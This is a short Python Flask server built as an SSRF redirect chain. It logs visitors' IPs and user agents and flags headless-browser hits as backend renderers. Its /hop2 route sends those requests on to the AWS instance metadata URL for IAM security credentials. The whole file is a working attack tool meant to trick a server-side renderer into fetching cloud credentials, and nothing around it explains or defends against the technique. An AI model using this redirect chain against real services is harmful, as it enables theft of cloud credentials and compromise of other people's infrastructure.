import os
from flask import Flask, redirect, request

app = Flask(__name__)


def log_request(label):
    real_ip = (
        request.headers.get("Cf-Connecting-Ip")
        or (request.headers.get("X-Forwarded-For") or request.remote_addr or "unknown")
          .split(",")[0]
          .strip()
    )
    ua = request.headers.get("User-Agent", "none")
    is_headless = "HeadlessChrome" in ua

    print(f"\n[{label}]")
    print(f"  Real IP : {real_ip}")
    print(f"  UA      : {ua}")
    print(f"  Headless: {is_headless}")
    print(f"  {'⚠️  BACKEND RENDERER HIT' if is_headless else '(your browser)'}")


@app.route("/hop1")
def hop1():
    log_request("HOP1")
    # 302, not 301 — avoid permanent caching across test runs
    return redirect("https://ssrf-gnd4.onrender.com/hop2", code=302)


@app.route("/hop2")
def hop2():
    log_request("HOP2 — REDIRECT FOLLOWED")
    # single slash; IMDSv1 only
    return redirect(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        code=302,
    )


@app.route("/")
def index():
    return "ok", 200


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 8080)),
    )
